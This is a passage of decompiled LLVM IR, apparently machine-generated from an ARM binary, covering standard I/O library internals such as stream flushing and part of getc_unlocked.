dec_label_pc_17080.dec_label_pc_17074_crit_edge:  ; preds = %dec_label_pc_17080
  %v0_17074.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17078.pre = load i32, i32* @r4, align 4
  %v1_17074 = inttoptr i32 %v0_17074.pre to i32*
  %v2_17074 = load i32, i32* %v1_17074, align 4
  store i32 %v2_17074, i32* %r3.global-to-local, align 4
  %v3_17078 = icmp uge i32 %v2_17074, %v1_17078.pre
  store i1 %v3_17078, i1* %cpsr_c.global-to-local, align 1
  %v9_17078 = icmp eq i32 %v2_17074, %v1_17078.pre
  br i1 %v9_17078, label %dec_label_pc_17080, label %dec_label_pc_17098

dec_label_pc_17094:                               ; preds = %dec_label_pc_17080
  %v0_17094 = load i32, i32* @r4, align 4
  store i32 %v0_17094, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17098

dec_label_pc_17098:                               ; preds = %dec_label_pc_17064, %dec_label_pc_17080.dec_label_pc_17074_crit_edge, %dec_label_pc_17094
  %v0_17098 = phi i32 [ %v0_17094, %dec_label_pc_17094 ], [ %v2_1707487, %dec_label_pc_17064 ], [ %v2_17074, %dec_label_pc_17080.dec_label_pc_17074_crit_edge ]
  %v1_17098 = phi i32 [ %v0_17094, %dec_label_pc_17094 ], [ 0, %dec_label_pc_17064 ], [ %v1_17078.pre, %dec_label_pc_17080.dec_label_pc_17074_crit_edge ]
  %v3_17098 = icmp uge i32 %v0_17098, %v1_17098
  store i1 %v3_17098, i1* %cpsr_c.global-to-local, align 1
  %v9_17098 = icmp eq i32 %v0_17098, %v1_17098
  br i1 %v9_17098, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_17098
  %v1_1709c = load i32, i32* @r7, align 4
  store i32 %v1_1709c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17098, %bb69
  %v1_170a0 = xor i1 %v9_17098, true
  call void @__pseudo_cond_branch(i1 %v1_170a0, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_170a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_170a4 = load i32, i32* @r5, align 4
  %v2_170a4 = add i32 %v1_170a4, 64
  %v3_170a4 = inttoptr i32 %v2_170a4 to i32*
  store i32 %v0_170a4, i32* %v3_170a4, align 4
  %v0_170a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_170a8

dec_label_pc_170a8:                               ; preds = %dec_label_pc_17058, %bb70
  %v0_170a8 = phi i32 [ %v0_17064, %dec_label_pc_17058 ], [ %v0_170a8.pre, %bb70 ]
  %v1_170a8 = add i32 %v0_170a8, 60
  %v2_170a8 = inttoptr i32 %v1_170a8 to i32*
  %v3_170a8 = load i32, i32* %v2_170a8, align 4
  %v1_170ac = add i32 %v3_170a8, 1
  store i32 %v1_170ac, i32* %r3.global-to-local, align 4
  store i32 %v1_170ac, i32* %v2_170a8, align 4
  %v0_170b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_170b4

dec_label_pc_170b4:                               ; preds = %dec_label_pc_17048, %dec_label_pc_170a8
  %v0_170cc = phi i32 [ %v0_17064, %dec_label_pc_17048 ], [ %v0_170b4.pre, %dec_label_pc_170a8 ]
  %v1_170b4 = inttoptr i32 %v0_170cc to i16*
  %v2_170b4 = load i16, i16* %v1_170b4, align 2
  %v3_170b4 = zext i16 %v2_170b4 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_170bc = or i32 %v3_170b4, %stack_var_-44.1
  %v1_170c0 = xor i32 %v2_170bc, 320
  store i32 %v1_170c0, i32* %r3.global-to-local, align 4
  %v1_170c4 = and i32 %v1_170c0, 832
  %v2_170c4 = icmp eq i32 %v1_170c4, 0
  br i1 %v2_170c4, label %dec_label_pc_170cc, label %bb71

dec_label_pc_170cc:                               ; preds = %dec_label_pc_170b4
  store i32 %v0_170cc, i32* %r0.global-to-local, align 4
  %v1_170d0 = call i32 @__stdio_wcommit(i32 %v0_170cc)
  store i32 %v1_170d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_170d4 = icmp eq i32 %v1_170d0, 0
  br i1 %v2_170d4, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_170cc
  %v1_170d8 = load i32, i32* @r5, align 4
  %v2_170d8 = inttoptr i32 %v1_170d8 to i16*
  %v3_170d8 = load i16, i16* %v2_170d8, align 2
  %v4_170d8 = zext i16 %v3_170d8 to i32
  store i32 %v4_170d8, i32* %r3.global-to-local, align 4
  %v2_170dc = add i32 %v1_170d8, 8
  %v3_170dc = inttoptr i32 %v2_170dc to i32*
  %v4_170dc = load i32, i32* %v3_170dc, align 4
  store i32 %v4_170dc, i32* %r2.global-to-local, align 4
  %v2_170e0 = and i32 %v4_170d8, 65471
  store i32 %v2_170e0, i32* %r3.global-to-local, align 4
  %v3_170e4 = add i32 %v1_170d8, 28
  %v4_170e4 = inttoptr i32 %v3_170e4 to i32*
  store i32 %v4_170dc, i32* %v4_170e4, align 4
  %v1_170e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_170e8 = trunc i32 %v1_170e8 to i16
  %v3_170e8 = load i32, i32* @r5, align 4
  %v4_170e8 = inttoptr i32 %v3_170e8 to i16*
  store i16 %v2_170e8, i16* %v4_170e8, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_170cc
  %v1_170ec = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_170ec, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_170b4, %.thread7
  %v0_170f0 = load i32, i32* @r6, align 4
  %v1_170f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_170f0 = add i32 %v1_170f0, %v0_170f0
  %v3_170f0 = inttoptr i32 %v2_170f0 to i32*
  %v4_170f0 = load i32, i32* %v3_170f0, align 4
  store i32 %v4_170f0, i32* %r3.global-to-local, align 4
  %v1_170f4 = inttoptr i32 %v4_170f0 to i32*
  %v2_170f4 = load i32, i32* %v1_170f4, align 4
  store i32 %v2_170f4, i32* %r3.global-to-local, align 4
  %v2_170f8 = icmp ugt i32 %v2_170f4, 1
  store i1 %v2_170f8, i1* %cpsr_c.global-to-local, align 1
  %v7_170f8 = icmp eq i32 %v2_170f4, 2
  br i1 %v7_170f8, label %dec_label_pc_17174, label %dec_label_pc_17100

dec_label_pc_17100:                               ; preds = %bb71
  %v0_17100 = load i32, i32* @r5, align 4
  %v1_17100 = add i32 %v0_17100, 60
  %v2_17100 = inttoptr i32 %v1_17100 to i32*
  %v3_17100 = load i32, i32* %v2_17100, align 4
  %v1_17104 = add i32 %v3_17100, -1
  store i32 %v1_17104, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17108 = icmp eq i32 %v1_17104, 0
  store i32 %v1_17104, i32* %v2_17100, align 4
  br i1 %v2_17108, label %dec_label_pc_17114, label %dec_label_pc_17174

dec_label_pc_17114:                               ; preds = %dec_label_pc_17100
  %v0_17114 = load i32, i32* %r3.global-to-local, align 4
  %v1_17114 = load i32, i32* @r5, align 4
  %v2_17114 = add i32 %v1_17114, 64
  %v3_17114 = inttoptr i32 %v2_17114 to i32*
  store i32 %v0_17114, i32* %v3_17114, align 4
  %v0_17118 = load i32, i32* @r5, align 4
  %v1_17118 = add i32 %v0_17118, 56
  store i32 %v1_17118, i32* @r7, align 4
  br label %dec_label_pc_1711c

dec_label_pc_1711c:                               ; preds = %dec_label_pc_1714c.dec_label_pc_1711c_crit_edge, %dec_label_pc_17114
  %v0_17124 = phi i32 [ %v0_17124.pre, %dec_label_pc_1714c.dec_label_pc_1711c_crit_edge ], [ %v1_17118, %dec_label_pc_17114 ]
  %v0_1711c = phi i32 [ %v0_1711c.pre, %dec_label_pc_1714c.dec_label_pc_1711c_crit_edge ], [ %v0_17118, %dec_label_pc_17114 ]
  %v1_1711c = add i32 %v0_1711c, 56
  %v2_1711c = inttoptr i32 %v1_1711c to i32*
  %v3_1711c = load i32, i32* %v2_1711c, align 4
  store i32 %v3_1711c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17124, i32* %r2.global-to-local, align 4
  %v1_1712897 = inttoptr i32 %v0_17124 to i32*
  %v2_1712898 = load i32, i32* %v1_1712897, align 4
  store i32 %v2_1712898, i32* %r3.global-to-local, align 4
  %v3_1712c100 = icmp uge i32 %v2_1712898, %v3_1711c
  store i1 %v3_1712c100, i1* %cpsr_c.global-to-local, align 1
  %v9_1712c106 = icmp eq i32 %v2_1712898, %v3_1711c
  br i1 %v9_1712c106, label %dec_label_pc_17134, label %dec_label_pc_1714c

dec_label_pc_17134:                               ; preds = %dec_label_pc_1711c, %dec_label_pc_17134.dec_label_pc_17128_crit_edge
  %v0_17134107 = phi i32 [ %v1_1712c.pre, %dec_label_pc_17134.dec_label_pc_17128_crit_edge ], [ %v3_1711c, %dec_label_pc_1711c ]
  store i32 %v0_17134107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17144 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17144, label %dec_label_pc_17148, label %dec_label_pc_17134.dec_label_pc_17128_crit_edge

dec_label_pc_17134.dec_label_pc_17128_crit_edge:  ; preds = %dec_label_pc_17134
  %v0_17128.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1712c.pre = load i32, i32* @r4, align 4
  %v1_17128 = inttoptr i32 %v0_17128.pre to i32*
  %v2_17128 = load i32, i32* %v1_17128, align 4
  store i32 %v2_17128, i32* %r3.global-to-local, align 4
  %v3_1712c = icmp uge i32 %v2_17128, %v1_1712c.pre
  store i1 %v3_1712c, i1* %cpsr_c.global-to-local, align 1
  %v9_1712c = icmp eq i32 %v2_17128, %v1_1712c.pre
  br i1 %v9_1712c, label %dec_label_pc_17134, label %dec_label_pc_1714c

dec_label_pc_17148:                               ; preds = %dec_label_pc_17134
  %v0_17148 = load i32, i32* @r4, align 4
  store i32 %v0_17148, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1714c

dec_label_pc_1714c:                               ; preds = %dec_label_pc_1711c, %dec_label_pc_17134.dec_label_pc_17128_crit_edge, %dec_label_pc_17148
  %v0_17154 = phi i32 [ %v0_17148, %dec_label_pc_17148 ], [ %v2_1712898, %dec_label_pc_1711c ], [ %v2_17128, %dec_label_pc_17134.dec_label_pc_17128_crit_edge ]
  %v1_1714c = phi i32 [ %v0_17148, %dec_label_pc_17148 ], [ %v3_1711c, %dec_label_pc_1711c ], [ %v1_1712c.pre, %dec_label_pc_17134.dec_label_pc_17128_crit_edge ]
  %v3_1714c = icmp uge i32 %v0_17154, %v1_1714c
  store i1 %v3_1714c, i1* %cpsr_c.global-to-local, align 1
  %v9_1714c = icmp eq i32 %v0_17154, %v1_1714c
  br i1 %v9_1714c, label %dec_label_pc_17154, label %dec_label_pc_1714c.dec_label_pc_1711c_crit_edge

dec_label_pc_1714c.dec_label_pc_1711c_crit_edge:  ; preds = %dec_label_pc_1714c
  %v0_1711c.pre = load i32, i32* @r5, align 4
  %v0_17124.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1711c

dec_label_pc_17154:                               ; preds = %dec_label_pc_1714c
  %v2_17154 = icmp ne i32 %v1_1714c, 0
  store i1 %v2_17154, i1* %cpsr_c.global-to-local, align 1
  %v7_17158 = icmp slt i32 %v1_1714c, 2
  br i1 %v7_17158, label %dec_label_pc_17174, label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %dec_label_pc_17154
  %v0_1715c = load i32, i32* @r5, align 4
  %v1_1715c = add i32 %v0_1715c, 56
  store i32 %v1_1715c, i32* %r0.global-to-local, align 4
  %v0_17160 = load i32, i32* %r1.global-to-local, align 4
  %v1_17160 = add i32 %v0_17160, 129
  store i32 %v1_17160, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17174

dec_label_pc_17174:                               ; preds = %dec_label_pc_17100, %dec_label_pc_1715c, %dec_label_pc_17154, %bb71, %dec_label_pc_1703c
  %v0_17174 = load i32, i32* @r5, align 4
  %v1_17174 = add i32 %v0_17174, 32
  %v2_17174 = inttoptr i32 %v1_17174 to i32*
  %v3_17174 = load i32, i32* %v2_17174, align 4
  store i32 %v3_17174, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17178 = icmp eq i32 %v3_17174, 0
  br i1 %v2_17178, label %dec_label_pc_17180, label %dec_label_pc_1703c

dec_label_pc_17180:                               ; preds = %dec_label_pc_17174, %dec_label_pc_1702c
  %v0_17180 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_17180, i32* %r0.global-to-local, align 4
  %v0_171bc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17188:                               ; preds = %dec_label_pc_16e64
  %v3_17188 = load i16, i16* %arg1, align 2
  %v4_17188 = zext i16 %v3_17188 to i32
  %v1_1718c = and i32 %v4_17188, 64
  store i32 %v1_1718c, i32* %r3.global-to-local, align 4
  %v2_1718c = icmp eq i32 %v1_1718c, 0
  br i1 %v2_1718c, label %bb72, label %dec_label_pc_17198

bb72:                                             ; preds = %dec_label_pc_17188
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17198:                               ; preds = %dec_label_pc_17188
  %v2_17198 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_17198, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1719c = icmp eq i32 %v2_17198, 0
  br i1 %v2_1719c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_17198
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_17198
  %v1_171a0 = load i32, i32* @r4, align 4
  %v2_171a0 = inttoptr i32 %v1_171a0 to i16*
  %v3_171a0 = load i16, i16* %v2_171a0, align 2
  %v4_171a0 = zext i16 %v3_171a0 to i32
  store i32 %v4_171a0, i32* %r3.global-to-local, align 4
  %v2_171a4 = add i32 %v1_171a0, 8
  %v3_171a4 = inttoptr i32 %v2_171a4 to i32*
  %v4_171a4 = load i32, i32* %v3_171a4, align 4
  store i32 %v4_171a4, i32* %r2.global-to-local, align 4
  %v2_171a8 = and i32 %v4_171a0, 65471
  store i32 %v2_171a8, i32* %r3.global-to-local, align 4
  %v2_171ac = trunc i32 %v2_171a8 to i16
  store i16 %v2_171ac, i16* %v2_171a0, align 2
  %v1_171b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_171b0 = load i32, i32* @r4, align 4
  %v3_171b0 = add i32 %v2_171b0, 28
  %v4_171b0 = inttoptr i32 %v3_171b0 to i32*
  store i32 %v1_171b0, i32* %v4_171b0, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_17180, %.thread14
  %v0_171bc = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_171bc.pre, %dec_label_pc_17180 ], [ 0, %.thread14 ]
  store i32 %v0_171bc, i32* %r0.global-to-local, align 4
  store i32 %v6_16e38, i32* %r5.global-to-local, align 4
  ret i32 %v0_171bc

; uselistorder directives
  uselistorder i32 %v0_171bc, { 1, 0 }
  uselistorder i32 %v3_17174, { 1, 2, 0 }
  uselistorder i32 %v0_17148, { 1, 0, 2 }
  uselistorder i32 %v1_1712c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_170cc, { 1, 0, 2 }
  uselistorder i32 %v0_17094, { 1, 0, 2 }
  uselistorder i32 %v1_17078.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1705c, { 1, 0 }
  uselistorder i32 %v0_17000, { 1, 0, 2 }
  uselistorder i32 %v1_16fe4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16fd4, { 1, 0 }
  uselistorder i32 %v0_16f98, { 1, 0, 2 }
  uselistorder i32 %v1_16f7c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16f64, { 1, 0 }
  uselistorder i32 %v0_16f2c, { 1, 0, 2 }
  uselistorder i32 %v1_16f10.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16f00, { 1, 0 }
  uselistorder i32 %v0_16ebc, { 1, 0, 2 }
  uselistorder i32 %v1_16ea0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16e78, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 52, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 54, 20, 21, 22, 23, 24, 25, 27, 26, 53, 28, 29, 30, 31, 33, 32, 51, 34, 35, 36, 37, 39, 38, 55, 40, 41, 42, 43, 45, 44, 0, 46, 47, 50, 48, 49 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 13, 3, 4, 5, 33, 34, 6, 7, 8, 9, 10, 37, 38, 11, 12, 1, 14, 15, 16, 35, 36, 17, 18, 19, 31, 32, 20, 21, 22, 23, 39, 40, 24, 25, 27, 26, 0, 28, 29, 30 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17174, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1714c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17134, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170b4, { 1, 0 }
  uselistorder label %dec_label_pc_170a8, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_17098, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17080, { 1, 0 }
  uselistorder label %dec_label_pc_1703c, { 1, 0 }
  uselistorder label %dec_label_pc_1702cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_17004, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16fec, { 1, 0 }
  uselistorder label %dec_label_pc_16fac, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_16f9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f84, { 1, 0 }
  uselistorder label %dec_label_pc_16f58, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16f30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f18, { 1, 0 }
  uselistorder label %dec_label_pc_16ed0, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16ec0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ea8, { 1, 0 }
  uselistorder label %dec_label_pc_16e74, { 1, 0 }
}

define i32 @function_171d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_171d0:
  %v0_171d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_171d0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_171d0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_171d0, %bb
  %v10_171e0 = phi i32 [ %arg1, %dec_label_pc_171d0 ], [ 0, %bb ]
  ret i32 %v10_171e0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_171e4 = load i32, i32* @r4, align 4
  store i32 %v3_171e4, i32* %stack_var_-12, align 4
  %v6_171e4 = load i32, i32* @r5, align 4
  %v9_171e4 = load i32, i32* @lr, align 4
  %v0_171e8 = load i32, i32* @r0, align 4
  %v1_171e8 = add i32 %v0_171e8, 16
  %v2_171e8 = inttoptr i32 %v1_171e8 to i32*
  %v3_171e8 = load i32, i32* %v2_171e8, align 4
  store i32 %v3_171e8, i32* %r2.global-to-local, align 4
  %v1_171ec = add i32 %v0_171e8, 24
  %v2_171ec = inttoptr i32 %v1_171ec to i32*
  %v3_171ec = load i32, i32* %v2_171ec, align 4
  %v3_171f0 = icmp ult i32 %v3_171e8, %v3_171ec
  store i32 %v0_171e8, i32* @r4, align 4
  br i1 %v3_171f0, label %bb, label %dec_label_pc_17210

bb:                                               ; preds = %entry
  %v2_171fc = inttoptr i32 %v3_171e8 to i8*
  %v3_171fc = load i8, i8* %v2_171fc, align 1
  %v4_171fc = zext i8 %v3_171fc to i32
  store i32 %v4_171fc, i32* %r0.global-to-local, align 4
  %v6_171fc = add i32 %v3_171e8, 1
  store i32 %v6_171fc, i32* %r2.global-to-local, align 4
  store i32 %v6_171fc, i32* %v2_171e8, align 4
  br label %dec_label_pc_172fc

dec_label_pc_17210:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r5, align 4
  %v1_17210 = inttoptr i32 %v0_171e8 to i16*
  %v2_17210 = load i16, i16* %v1_17210, align 2
  %v3_17210 = zext i16 %v2_17210 to i32
  %v1_17214 = and i32 %v3_17210, 131
  %tmp25 = icmp ugt i32 %v1_17214, 128
  br i1 %tmp25, label %dec_label_pc_17230, label %dec_label_pc_17220

dec_label_pc_17220:                               ; preds = %dec_label_pc_17210
  store i32 128, i32* @r1, align 4
  %v0_17224 = call i32 @__stdio_trans2r_o()
  store i32 %v0_17224, i32* %r0.global-to-local, align 4
  %v2_17228 = icmp eq i32 %v0_17224, 0
  br i1 %v2_17228, label %dec_label_pc_17220.dec_label_pc_17230_crit_edge, label %dec_label_pc_172f8

dec_label_pc_17220.dec_label_pc_17230_crit_edge:  ; preds = %dec_label_pc_17220
  %v0_17230.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17230

dec_label_pc_17230:                               ; preds = %dec_label_pc_17220.dec_label_pc_17230_crit_edge, %dec_label_pc_17210
  %v2_17270 = phi i32 [ %v0_17230.pre, %dec_label_pc_17220.dec_label_pc_17230_crit_edge ], [ %v0_171e8, %dec_label_pc_17210 ]
  %v1_17230 = inttoptr i32 %v2_17270 to i16*
  %v2_17230 = load i16, i16* %v1_17230, align 2
  %v3_17230 = zext i16 %v2_17230 to i32
  store i32 %v3_17230, i32* %r2.global-to-local, align 4
  %v1_17234 = and i32 %v3_17230, 2
  %v2_17234 = icmp eq i32 %v1_17234, 0
  br i1 %v2_17234, label %dec_label_pc_17260, label %dec_label_pc_1723c

dec_label_pc_1723c:                               ; preds = %dec_label_pc_17230
  %tmp26 = urem i16 %v2_17230, 2
  %v1_1723c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_1723c
  %v4_17240 = and i32 %tmp22, 4
  %v5_17240 = add i32 %v4_17240, %v2_17270
  %v1_17244 = add i32 %v5_17240, 36
  %v2_17244 = inttoptr i32 %v1_17244 to i8*
  %v3_17244 = load i8, i8* %v2_17244, align 1
  %v4_17244 = zext i8 %v3_17244 to i32
  %v1_17248 = add nsw i32 %v3_17230, -1
  store i32 %v1_17248, i32* %r2.global-to-local, align 4
  store i32 %v4_17244, i32* %r0.global-to-local, align 4
  %v2_17254 = add i32 %v2_17270, 40
  %v3_17254 = inttoptr i32 %v2_17254 to i32*
  store i32 0, i32* %v3_17254, align 4
  %v0_17258 = load i32, i32* %r2.global-to-local, align 4
  %v1_17258 = trunc i32 %v0_17258 to i16
  %v2_17258 = load i32, i32* @r4, align 4
  %v3_17258 = inttoptr i32 %v2_17258 to i16*
  store i16 %v1_17258, i16* %v3_17258, align 2
  br label %dec_label_pc_172fc

dec_label_pc_17260:                               ; preds = %dec_label_pc_17230
  %v1_17260 = add i32 %v2_17270, 16
  %v1_17264 = inttoptr i32 %v1_17260 to i32*
  %v2_17264 = load i32, i32* %v1_17264, align 4
  store i32 %v2_17264, i32* @r1, align 4
  %v3_17264 = add i32 %v2_17270, 20
  %v4_17264 = inttoptr i32 %v3_17264 to i32*
  %v5_17264 = load i32, i32* %v4_17264, align 4
  %v9_17268 = icmp eq i32 %v5_17264, %v2_17264
  br i1 %v9_17268, label %dec_label_pc_17278, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17260
  %v2_1726c = inttoptr i32 %v2_17264 to i8*
  %v3_1726c = load i8, i8* %v2_1726c, align 1
  %v4_1726c = zext i8 %v3_1726c to i32
  store i32 %v4_1726c, i32* %r0.global-to-local, align 4
  %v6_1726c = add i32 %v2_17264, 1
  store i32 %v6_1726c, i32* @r1, align 4
  store i32 %v6_1726c, i32* %v1_17264, align 4
  br label %dec_label_pc_172fc

dec_label_pc_17278:                               ; preds = %dec_label_pc_17260
  %v1_17278 = add i32 %v2_17270, 4
  %v2_17278 = inttoptr i32 %v1_17278 to i32*
  %v3_17278 = load i32, i32* %v2_17278, align 4
  %v7_1727c = icmp eq i32 %v3_17278, -2
  br i1 %v7_1727c, label %.thread7, label %dec_label_pc_17290

.thread7:                                         ; preds = %dec_label_pc_17278
  %v2_17280 = or i16 %v2_17230, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17280, i16* %v1_17230, align 2
  br label %dec_label_pc_172fc

dec_label_pc_17290:                               ; preds = %dec_label_pc_17278
  %v1_17290 = and i32 %v3_17230, 768
  %v2_17290 = icmp eq i32 %v1_17290, 0
  br i1 %v2_17290, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_17290
  %v1_17298 = load i32, i32* @r5, align 4
  %v3_17298 = add i32 %v1_17298, 76
  %v4_17298 = inttoptr i32 %v3_17298 to i32*
  %v5_17298 = load i32, i32* %v4_17298, align 4
  store i32 %v5_17298, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17290, %bb23
  store i32 94880, i32* @lr, align 4
  %v1_1729c = xor i1 %v2_17290, true
  call void @__pseudo_cond_branch(i1 %v1_1729c, i32 ptrtoint (i32* @global_var_16e38.619 to i32))
  %v0_172a0 = load i32, i32* @r4, align 4
  %v1_172a0 = add i32 %v0_172a0, 8
  store i32 %v1_172a0, i32* %r2.global-to-local, align 4
  %v1_172a4 = inttoptr i32 %v1_172a0 to i32*
  %v2_172a4 = load i32, i32* %v1_172a4, align 4
  store i32 %v2_172a4, i32* %r2.global-to-local, align 4
  %v3_172a4 = add i32 %v0_172a0, 12
  %v4_172a4 = inttoptr i32 %v3_172a4 to i32*
  %v5_172a4 = load i32, i32* %v4_172a4, align 4
  %v9_172a8 = icmp eq i32 %v5_172a4, %v2_172a4
  br i1 %v9_172a8, label %dec_label_pc_172dc, label %dec_label_pc_172b0

dec_label_pc_172b0:                               ; preds = %.thread9
  %v2_172b0 = add i32 %v0_172a0, 24
  %v3_172b0 = inttoptr i32 %v2_172b0 to i32*
  store i32 %v2_172a4, i32* %v3_172b0, align 4
  %v0_172b4 = load i32, i32* @r4, align 4
  store i32 %v0_172b4, i32* %r0.global-to-local, align 4
  %v2_172b8 = call i32 @__stdio_rfill(i32 %v0_172b4)
  store i32 %v2_172b8, i32* %r0.global-to-local, align 4
  %v2_172bc = icmp eq i32 %v2_172b8, 0
  br i1 %v2_172bc, label %dec_label_pc_172f8, label %dec_label_pc_172c4

dec_label_pc_172c4:                               ; preds = %dec_label_pc_172b0
  %v0_172c4 = load i32, i32* @r4, align 4
  %v1_172c4 = add i32 %v0_172c4, 20
  %v2_172c4 = inttoptr i32 %v1_172c4 to i32*
  %v3_172c4 = load i32, i32* %v2_172c4, align 4
  %v2_172c8 = add i32 %v0_172c4, 24
  %v3_172c8 = inttoptr i32 %v2_172c8 to i32*
  store i32 %v3_172c4, i32* %v3_172c8, align 4
  %v0_172cc = load i32, i32* @r4, align 4
  %v1_172cc = add i32 %v0_172cc, 16
  %v2_172cc = inttoptr i32 %v1_172cc to i32*
  %v3_172cc = load i32, i32* %v2_172cc, align 4
  %v1_172d0 = inttoptr i32 %v3_172cc to i8*
  %v2_172d0 = load i8, i8* %v1_172d0, align 1
  %v3_172d0 = zext i8 %v2_172d0 to i32
  store i32 %v3_172d0, i32* %r0.global-to-local, align 4
  %v5_172d0 = add i32 %v3_172cc, 1
  store i32 %v5_172d0, i32* %v2_172cc, align 4
  br label %dec_label_pc_172fc

dec_label_pc_172dc:                               ; preds = %.thread9
